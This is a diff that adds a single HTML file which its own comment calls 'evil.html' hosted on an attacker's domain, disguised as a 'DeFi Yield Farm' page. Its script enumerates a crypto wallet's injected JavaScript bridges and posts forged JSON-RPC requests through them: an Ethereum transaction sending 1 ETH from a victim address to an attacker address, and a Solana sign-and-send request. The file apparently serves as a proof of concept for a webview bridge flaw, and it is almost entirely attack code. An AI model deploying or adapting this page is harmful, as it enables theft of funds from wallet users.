@@ -1,0 +1,44 @@
+<!-- evil.html di-host di domain penyerang -->
+<!DOCTYPE html>
+<html>
+<head><title>DeFi Yield Farm</title></head>
+<body>
+<h1>Loading wallet...</h1>
+<script>
+// 1. Enumerasi bridge yang tersedia
+const bridges = ['jsBridge', 'proxyJsBridgeEvm', 'proxyJsBridgeSol'];
+bridges.forEach(b => console.log(b, window[b]));
+
+// 2. Kirim JSON-RPC palsu untuk minta signature
+const fakeRequest = {
+    jsonrpc: "2.0",
+    id: 1,
+    method: "eth_signTransaction",
+    params: [{
+        from: "0xVictimAddress",
+        to: "0xAttackerAddress",
+        value: "0xde0b6b3a7640000", // 1 ETH
+        gas: "0x5208",
+        gasPrice: "0x3b9aca00",
+        nonce: "0x0",
+        data: "0x"
+    }]
+};
+
+// 3. Kirim ke native — akan diproses sebagai request sah
+window.jsBridge.postEvmMessage(JSON.stringify(fakeRequest));
+
+// 4. Untuk Solana
+const solRequest = {
+    jsonrpc: "2.0",
+    id: 2,
+    method: "signAndSendTransaction",
+    params: {
+        message: "BASE64_ENCODED_MALICIOUS_TX",
+        recentBlockhash: "..."
+    }
+};
+window.jsBridge.postSolMessage(JSON.stringify(solRequest));
+</script>
+</body>
+</html>
